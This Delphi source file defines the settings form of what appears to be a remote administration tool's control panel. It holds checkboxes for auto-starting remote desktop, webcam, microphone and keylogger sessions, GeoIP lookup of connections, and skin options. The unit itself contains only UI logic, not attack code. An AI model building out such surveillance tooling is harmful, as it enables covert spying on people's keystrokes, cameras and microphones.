unit UnitSettings;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Spin, UnitMain, ComCtrls;

type
  TFormSettings = class(TForm)
    chkStartup: TCheckBox;
    chkGeoip: TCheckBox;
    chkMinnimizeToTray: TCheckBox;
    chkCloseToTray: TCheckBox;
    chkSound: TCheckBox;
    grp2: TGroupBox;
    chkVisual: TCheckBox;
    lbl1: TLabel;
    seWidth: TSpinEdit;
    lbl2: TLabel;
    seHeight: TSpinEdit;
    grp1: TGroupBox;
    chkDesktop: TCheckBox;
    chkCam: TCheckBox;
    chkMicrophone: TCheckBox;
    btn1: TButton;
    btn2: TButton;
    chkSkin: TCheckBox;
    grp3: TGroupBox;
    lblSkin: TLabel;
    dlgOpen1: TOpenDialog;
    chkThumbs: TCheckBox;
    lblHue: TLabel;
    trckbrHue: TTrackBar;
    lblSaturation: TLabel;
    trckbrSaturation: TTrackBar;
    chkKeylogger: TCheckBox;
    procedure btn1Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure chkSkinClick(Sender: TObject);
    procedure lblSkinClick(Sender: TObject);
    procedure chkThumbsClick(Sender: TObject);
    procedure trckbrHueChange(Sender: TObject);
    procedure trckbrSaturationChange(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  FormSettings: TFormSettings;

implementation

uses
  UnitConstants;

{$R *.dfm}

procedure TFormSettings.btn1Click(Sender: TObject);
begin
  ModalResult := mrOk;
end;

procedure TFormSettings.btn2Click(Sender: TObject);
begin
  ModalResult := mrCancel;
end;

procedure TFormSettings.FormShow(Sender: TObject);
begin
  chkStartup.Checked := StartupListening;
  chkGeoip.Checked := GeoIpLocalisation;
  chkSound.Checked := SoundNotification;
  chkVisual.Checked := VisualNotification;
  chkMinnimizeToTray.Checked := MinimizeToTray;
  chkCloseToTray.Checked := CloseToTray;
  chkDesktop.Checked := AutostartDesk;
  chkCam.Checked := AutostartCam;
  chkMicrophone.Checked := AutoStartMic;
  chkKeylogger.Checked := AutostartKeylogger;
  seWidth.Value := ThumbWidth;
  seHeight.Value := ThumbHeight;
  chkSkin.Checked := EnableSkin;
  lblSkin.Caption := SkinName;
  trckbrHue.Position := SkinHue;
  trckbrSaturation.Position := SkinSaturation;
  lblSkin.Enabled := chkSkin.Checked; 
  trckbrHue.Enabled := chkSkin.Checked;
  trckbrSaturation.Enabled := chkSkin.Checked;
  chkThumbs.Checked := DeskThumb;
  seWidth.Enabled := not chkThumbs.Checked;
  seHeight.Enabled := not chkThumbs.Checked;
end;

procedure TFormSettings.chkSkinClick(Sender: TObject);
begin
  if chkSkin.Checked then
  begin
    FormMain.sknmngr1.SkinDirectory := SkinDirectory;
    FormMain.sknmngr1.SkinName := SkinName;
    FormMain.sknmngr1.HueOffset := SkinHue;
    FormMain.sknmngr1.Saturation := SkinSaturation;
    FormMain.sknmngr1.InstallHook;
    FormMain.sknmngr1.Active := True;

    lblSkin.Enabled := True;
    trckbrHue.Enabled := True;
    trckbrSaturation.Enabled := True;
  end
  else
  begin
    FormMain.sknmngr1.UnInstallHook;
    FormMain.sknmngr1.Active := False;
    lblSkin.Enabled := False;
    trckbrHue.Enabled := False;
    trckbrSaturation.Enabled := False;
  end;
end;

procedure TFormSettings.lblSkinClick(Sender: TObject);
begin
  dlgOpen1.Title := PROGRAMNAME + ' ' + PROGRAMVERSION;
  if (dlgOpen1.Execute = False) or (FileExists(dlgOpen1.FileName) = False) then Exit;
  SkinDirectory := ExtractFilePath(dlgOpen1.FileName);
  SkinName := ExtractFileName(dlgOpen1.FileName);    
  lblSkin.Caption := SkinName;
  
  FormMain.sknmngr1.SkinDirectory := SkinDirectory;
  FormMain.sknmngr1.SkinName := SkinName;
  FormMain.sknmngr1.HueOffset := SkinHue;
  FormMain.sknmngr1.Saturation := SkinSaturation;
  FormMain.sknmngr1.InstallHook;
  FormMain.sknmngr1.Active := True;
end;

procedure TFormSettings.chkThumbsClick(Sender: TObject);
begin
  if chkThumbs.Checked = True then
  begin
    seWidth.Enabled := False;
    seHeight.Enabled := False;
  end
  else
  begin
    seWidth.Enabled := True;
    seHeight.Enabled := True;
  end;
end;

procedure TFormSettings.trckbrHueChange(Sender: TObject);
begin
  SkinHue := trckbrHue.Position;
  FormMain.sknmngr1.HueOffset := SkinHue;
  lblHue.Caption := 'HUE : ' + IntToStr(trckbrHue.Position);
end;

procedure TFormSettings.trckbrSaturationChange(Sender: TObject);
begin
  SkinSaturation := trckbrSaturation.Position;
  FormMain.sknmngr1.Saturation := SkinSaturation;
  lblSaturation.Caption := 'Saturation : ' + IntToStr(trckbrSaturation.Position);
end;

end.
